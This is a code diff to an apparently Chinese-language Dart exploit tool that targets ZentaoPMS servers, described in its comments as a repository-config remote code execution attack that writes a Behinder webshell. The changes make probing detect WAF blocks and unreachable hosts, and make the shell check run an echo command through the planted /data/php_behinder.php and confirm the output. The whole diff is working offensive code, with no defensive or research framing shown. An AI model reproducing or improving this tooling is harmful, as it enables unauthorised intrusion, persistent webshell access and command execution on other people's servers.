@@ -2,6 +2,8 @@ import 'dart:convert';
 
 import 'package:http/http.dart' as http;
 
+import '../core/exploit_error.dart';
+
 /// 禅道(ZentaoPMS) 仓库配置 RCE + 冰蝎 WebShell 写入
 ///
 /// 思路参考你提供的 Python POC：
@@ -32,6 +34,8 @@ class ZentaoExpService {
         ? rootUrl.substring(0, rootUrl.length - 1)
         : rootUrl;
     final client = http.Client();
+    var sawAnyResponse = false;
+    var sawError = false;
     try {
       for (final p in _candidatePaths) {
         final probeUrl = '$base$p/index.php?m=misc&f=captcha&sessionVar=user';
@@ -42,6 +46,15 @@ class ZentaoExpService {
             'User-Agent':
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
           }).timeout(timeout);
+          if (res.statusCode == 403 ||
+              res.statusCode == 406 ||
+              res.statusCode == 429) {
+            throw ExploitBlocked(
+              '禅道入口探测被拒',
+              statusCode: res.statusCode,
+            );
+          }
+          sawAnyResponse = true;
           final cookie = res.headers['set-cookie'] ?? '';
           onLog?.call('    HTTP ${res.statusCode} | Set-Cookie: ${cookie.isEmpty ? "(无)" : cookie.substring(0, cookie.length.clamp(0, 120))}');
           if (cookie.contains('zentaosid=')) {
@@ -57,8 +70,13 @@ class ZentaoExpService {
             return '$base$p';
           }
         } catch (e) {
+          sawError = true;
           onLog?.call('    异常: $e');
         }
+      }
+      // 一个 HTTP 响应都没拿到 ≠ 目标没有禅道：这是"没测通"。
+      if (!sawAnyResponse && sawError) {
+        throw const ExploitNotWorking('禅道入口全部超时/不可达，无法判定');
       }
       onLog?.call('[-] 未在任何候选路径发现禅道');
     } finally {
@@ -92,6 +110,9 @@ class ZentaoExpService {
       };
       final captchaUrl = _u('/index.php?m=misc&f=captcha&sessionVar=user');
       final r = await client.get(captchaUrl, headers: headers).timeout(timeout);
+      if (r.statusCode == 403 || r.statusCode == 429) {
+        throw ExploitBlocked('禅道 captcha 被拒', statusCode: r.statusCode);
+      }
       final cookies = r.headers['set-cookie'] ?? '';
       final match = RegExp(r'zentaosid=([^;]+);?').firstMatch(cookies);
       if (match == null) {
@@ -206,20 +227,27 @@ class ZentaoExpService {
   }
 
   /// 访问 /data/php_behinder.php，简单验证是否可用
-  Future<bool> verifyShell({void Function(String log)? onLog}) async {
+  Future<bool> verifyShell({
+    String param = 'c',
+    void Function(String log)? onLog,
+  }) async {
     final client = http.Client();
     try {
-      final shellUrl = _u('/data/php_behinder.php');
-      // 仅以 HTTP 200 作为存在性的弱验证：php_behinder.php 通过 GET/空 POST 时通常返回空响应。
-      final res = await client
-          .get(shellUrl)
-          .timeout(timeout);
-      if (res.statusCode == 200) {
-        onLog?.call('[+] WebShell 验证成功(HTTP 200): ${shellUrl.toString()}');
+      // 只认 HTTP 200 是弱验证：任何已存在的同名文件、甚至 200 错误页都会通过。
+      // 改成"让 shell 执行一条命令并回显唯一标记"，才证明它真是我们的马。
+      final marker = 'MXZENTAO${DateTime.now().millisecondsSinceEpoch}';
+      final shellUrl = _u(
+        '/data/php_behinder.php?$param=${Uri.encodeComponent('echo $marker')}',
+      );
+      final res = await client.get(shellUrl).timeout(timeout);
+      final ok = res.statusCode == 200 && res.body.contains(marker);
+      if (ok) {
+        onLog?.call('[+] WebShell 回显验证通过: $shellUrl');
         return true;
       }
       onLog?.call(
-        '[!] WebShell 验证失败，HTTP ${res.statusCode}, 长度 ${res.body.length}',
+        '[!] WebShell 验证失败，HTTP ${res.statusCode}, 长度 ${res.body.length}'
+        '（响应里没有回显标记 $marker）',
       );
       return false;
     } catch (e) {
